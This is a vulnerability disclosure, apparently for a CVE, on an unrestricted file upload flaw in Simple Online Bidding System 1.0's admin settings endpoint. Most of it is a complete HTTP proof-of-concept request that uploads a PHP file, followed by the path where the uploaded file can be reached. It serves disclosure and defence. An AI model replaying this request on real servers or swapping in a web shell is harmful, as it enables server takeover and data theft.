## Affected version: 
Simple Online Bidding System - 1.0



## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

## Vulnerability File:
/simple-online-bidding-system/admin/ajax.php?action=save_settings

## Description:
Simple Online Bidding System 1.0 is vulnerable to the unrestricted file upload attack of /simple-online-bidding-system/admin/ajax.php?action=save_settings. An attacker can use this vulnerability to directly upload malicious scripts to the target server. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /simple-online-bidding-system/admin/ajax.php?action=save_settings HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------25037955527065652752621416028
Content-Length: 1708
Origin: http://localhost
Connection: close
Referer: http://localhost/simple-online-bidding-system/admin/index.php?page=site_settings
Cookie: PHPSESSID=q643apn08ggv5g81r5q8pocl6t
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23

-----------------------------25037955527065652752621416028
Content-Disposition: form-data; name="name"

Simple Online Bidding System
-----------------------------25037955527065652752621416028
Content-Disposition: form-data; name="email"

info@sample.comm
-----------------------------25037955527065652752621416028
Content-Disposition: form-data; name="contact"

+6948 8542 623
-----------------------------25037955527065652752621416028
Content-Disposition: form-data; name="about"

<p style="text-align: center; background: transparent; position: relative;"><span style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-weight: 400; text-align: justify;">&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</span><br></p><p style="text-align: center; background: transparent; position: relative;"><br></p><p style="text-align: center; background: transparent; position: relative;"><br></p><p></p>
-----------------------------25037955527065652752621416028
Content-Disposition: form-data; name="img"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------25037955527065652752621416028--
```
<img width="1263" alt="image" src="https://github.com/Isfulou/cve/assets/117758486/dc3935b2-8923-4d93-b0bb-6a7ea5518d8f">

Visit the /simple-online-bidding-system/admin/assets/uploads/1719140880_1.php file

<img width="1296" alt="image" src="https://github.com/Isfulou/cve/assets/117758486/6cb03444-38d1-41b8-a333-5f8ee4c910a4">

